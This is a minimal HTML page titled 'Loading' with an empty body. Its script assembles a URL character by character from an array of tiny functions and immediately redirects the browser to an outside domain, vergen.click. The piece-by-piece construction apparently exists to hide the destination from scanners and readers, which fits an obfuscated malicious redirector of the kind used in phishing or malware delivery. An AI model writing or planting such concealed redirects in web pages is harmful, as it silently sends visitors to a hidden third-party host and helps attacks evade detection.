<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            function() { return 't'; },
            function() { return 't'; },
            () => 'p',
            () => 's',
            function() { return ':'; },
            _ => '/',
            _ => '/',
            () => 'v',
            _ => 'e',
            _ => 'r',
            _ => 'g',
            _ => 'e',
            () => 'n',
            _ => '.',
            function() { return 'c'; },
            _ => 'l',
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            _ => '/',
            function() { return 's'; },
            _ => '/',
            _ => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
